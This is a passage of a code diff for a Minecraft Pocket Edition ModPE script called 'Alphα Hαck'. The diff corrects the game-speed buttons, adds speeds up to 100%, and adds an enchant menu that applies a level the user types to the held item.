                 }
             }));
             dmenuLayout.addView(d3);
@@ -4382,7 +4593,7 @@ var d1 = new Button(ctx);
             d4.setText("Speed 15%");       
             d4.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(35);
+                	ModPE.setGameSpeed(15);
                 }
             }));
             dmenuLayout.addView(d4);
@@ -4391,7 +4602,7 @@ var d1 = new Button(ctx);
             d5.setText("Speed 20%");       
             d5.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(40);
+                	ModPE.setGameSpeed(20);
                 }
             }));
             dmenuLayout.addView(d5);
@@ -4400,7 +4611,7 @@ var d1 = new Button(ctx);
             d6.setText("Speed 25%");       
             d6.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(45);
+                	ModPE.setGameSpeed(25);
                 }
             }));
             dmenuLayout.addView(d6);
@@ -4409,7 +4620,7 @@ var d1 = new Button(ctx);
             d7.setText("Speed 30%");       
             d7.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(50);
+                	ModPE.setGameSpeed(30);
                 }
             }));
             dmenuLayout.addView(d7);
@@ -4418,7 +4629,7 @@ var d1 = new Button(ctx);
             d8.setText("Speed 35%");       
             d8.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(55);
+                	ModPE.setGameSpeed(35);
                 }
             }));
             dmenuLayout.addView(d8);
@@ -4427,7 +4638,7 @@ var d1 = new Button(ctx);
             d9.setText("Speed 40%");       
             d9.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(60);
+                	ModPE.setGameSpeed(40);
                 }
             }));
             dmenuLayout.addView(d9);
@@ -4436,7 +4647,7 @@ var d10 = new Button(ctx);
             d10.setText("Speed 45%");       
             d10.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(65);
+                	ModPE.setGameSpeed(45);
                 }
             }));
             dmenuLayout.addView(d10);
@@ -4445,10 +4656,100 @@ var d11 = new Button(ctx);
             d11.setText("Speed 50%");       
             d11.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){         
-                	ModPE.setGameSpeed(70);
+                	ModPE.setGameSpeed(50);
                 }
             }));
             dmenuLayout.addView(d11);
+
+var d12 = new Button(ctx);
+            d12.setText("Speed 55%");       
+            d12.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(55);
+                }
+            }));
+            dmenuLayout.addView(d12);
+
+var d13 = new Button(ctx);
+            d13.setText("Speed 60%");       
+            d13.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(60);
+                }
+            }));
+            dmenuLayout.addView(d13);
+
+var d14 = new Button(ctx);
+            d14.setText("Speed 65%");       
+            d14.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(65);
+                }
+            }));
+            dmenuLayout.addView(d14);
+
+var d15 = new Button(ctx);
+            d15.setText("Speed 70%");       
+            d15.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(70);
+                }
+            }));
+            dmenuLayout.addView(d15);
+
+var d16 = new Button(ctx);
+            d16.setText("Speed 75%");       
+            d16.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(75);
+                }
+            }));
+            dmenuLayout.addView(d16);
+
+var d17 = new Button(ctx);
+            d17.setText("Speed 80%");       
+            d17.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(80);
+                }
+            }));
+            dmenuLayout.addView(d17);
+
+var d18 = new Button(ctx);
+            d18.setText("Speed 85%");       
+            d18.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(85);
+                }
+            }));
+            dmenuLayout.addView(d18);
+
+var d19 = new Button(ctx);
+            d19.setText("Speed 90%");       
+            d19.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(90);
+                }
+            }));
+            dmenuLayout.addView(d19);
+
+var d20 = new Button(ctx);
+            d20.setText("Speed 95%");       
+            d20.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(95);
+                }
+            }));
+            dmenuLayout.addView(d20);
+
+var d21 = new Button(ctx);
+            d21.setText("Speed 100%");       
+            d21.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+                	ModPE.setGameSpeed(100);
+                }
+            }));
+            dmenuLayout.addView(d21);
 		
 		var exit2 = new android.widget.Button(ctx);
 		exit2.setText("Exit");
@@ -4460,7 +4761,7 @@ showMenuBtn();
 		});
 		dmenuLayout.addView(exit2);
 
-            dmenu = new PopupWindow(dmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            dmenu = new PopupWindow(dmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             dmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             dmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -4468,6 +4769,25 @@ showMenuBtn();
             }
     }}));
 }
+
+/***********************/
+
+var btn10 = new android.widget.Button(ctx);
+            btn10.setText("Enchant Menu");
+if(GetLang=="de_DE")btn10.setText('Enchant Menü');
+if(GetLang=="ko_KR")btn10.setText('인첸트 메뉴');
+
+if(GetLang=="es_MX")btn10.setText('Menú de Enchant');
+btn10.setTextColor(GUIBtns);
+            btn10.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ExMenu();
+menu.dismiss();
+                }
+            }));
+            menuLayout.addView(btn10);
+
+/***********************/
 
 function ExMenu() {
 ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
@@ -4482,13 +4802,13 @@ ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
             xmenuLayout1.addView(xmenuScroll);
 
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		xmenuLayout.addView(MainTitle);
 
 var xtitle = new android.widget.TextView(ctx); xtitle.setGravity(android.view.Gravity.CENTER);
-		xtitle.setText("Experience Menu");
+		xtitle.setText("Enchant Menu");
        xtitle.setTextColor(GUIName);
 		xtitle.setTextSize(20);
 		xmenuLayout.addView(xtitle);
@@ -4503,6 +4823,1357 @@ xmenu.dismiss();
             }));
             xmenuLayout.addView(button);
 
+var ena = new Button(ctx);
+            ena.setText("Aqua Affinity");
+            ena.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en1();
+                }
+            }));
+            xmenuLayout.addView(ena);
+
+function en1() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add1();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add1() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.AQUA_AFFINITY,ll);
+}
+
+var enb = new Button(ctx);
+            enb.setText("Bane Of Athropods");
+            enb.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en2();
+                }
+            }));
+            xmenuLayout.addView(enb);
+
+function en2() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add2();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add2() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.BANE_OF_ARTHROPODS,ll);
+}
+
+var enc = new Button(ctx);
+            enc.setText("Blast Protection");
+            enc.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en3();
+                }
+            }));
+            xmenuLayout.addView(enc);
+
+function en3() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add3();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add3() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.BLAST_PROTECTION,ll);
+}
+
+var enf = new Button(ctx);
+            enf.setText("Depth Strider");
+            enf.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en5();
+                }
+            }));
+            xmenuLayout.addView(enf);
+
+function en5() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add5();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add5() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.DEPTH_STRIDER,ll);
+}
+
+var ene = new Button(ctx);
+            ene.setText("Efficiency");
+            ene.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en6();
+                }
+            }));
+            xmenuLayout.addView(ene);
+
+function en6() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add6();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add6() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.EFFICIENCY,ll);
+}
+
+var eng = new Button(ctx);
+            eng.setText("Feather Falling");
+            eng.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en7();
+                }
+            }));
+            xmenuLayout.addView(eng);
+
+function en7() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add7();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add7() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.FEATHER_FALLING,ll);
+}
+
+var enh = new Button(ctx);
+            enh.setText("Fire Aspect");
+            enh.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en8();
+                }
+            }));
+            xmenuLayout.addView(enh);
+
+function en8() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add8();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add8() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.FIRE_ASPECT,ll);
+}
+
+var eni = new Button(ctx);
+            eni.setText("Fire Protection");
+            eni.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en9();
+                }
+            }));
+            xmenuLayout.addView(eni);
+
+function en9() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add9();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add9() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.FIRE_PROTECTION,ll);
+}
+
+var enj = new Button(ctx);
+            enj.setText("Flame");
+            enj.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en10();
+                }
+            }));
+            xmenuLayout.addView(enj);
+
+function en10() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add10();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add10() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.FLAME,ll);
+}
+
+var enk = new Button(ctx);
+            enk.setText("Fortune");
+            enk.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en11();
+                }
+            }));
+            xmenuLayout.addView(enk);
+
+function en11() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add11();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add11() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.FORTUNE,ll);
+}
+
+var enl = new Button(ctx);
+            enl.setText("Infinity");
+            enl.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en12();
+                }
+            }));
+            xmenuLayout.addView(enl);
+
+function en12() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add12();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add12() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.INFINITY,ll);
+}
+
+var enm = new Button(ctx);
+            enm.setText("Knockback");
+            enm.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en13();
+                }
+            }));
+            xmenuLayout.addView(enm);
+
+function en13() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add13();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add13() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.KNOCKBACK,ll);
+}
+
+var enn = new Button(ctx);
+            enn.setText("Looting");
+            enn.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en14();
+                }
+            }));
+            xmenuLayout.addView(enn);
+
+function en14() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add14();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add14() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.LOOTING,ll);
+}
+
+var eno = new Button(ctx);
+            eno.setText("Luck of the sea");
+            eno.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en15();
+                }
+            }));
+            xmenuLayout.addView(eno);
+
+function en15() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add15();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add15() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.LUCK_OF_THE_SEA,ll);
+}
+
+var enp = new Button(ctx);
+            enp.setText("Lure");
+            enp.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en16();
+                }
+            }));
+            xmenuLayout.addView(enp);
+
+function en16() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add16();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add16() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.LURE,ll);
+}
+
+var enq = new Button(ctx);
+            enq.setText("Power");
+            enq.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en17();
+                }
+            }));
+            xmenuLayout.addView(enq);
+
+function en17() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var lvl = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter Level");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(lvl);
+Layer.addView(Exit);
+
+lvl.setText("");
+lvl.setHint("Level");
+Exit.setText("Done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ll =lvl.getText();
+Dialog.dismiss();
+add17();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The Enchant Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+function add17() {
+Player.enchant(Player.getSelectedSlotId(), Enchantment.POWER,ll);
+}
+
+var enr = new Button(ctx);
+            enr.setText("Projectile protection");
+            enr.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+en18();
+                }
+            }));
+            xmenuLayout.addView(enr);
+
+function en18() {
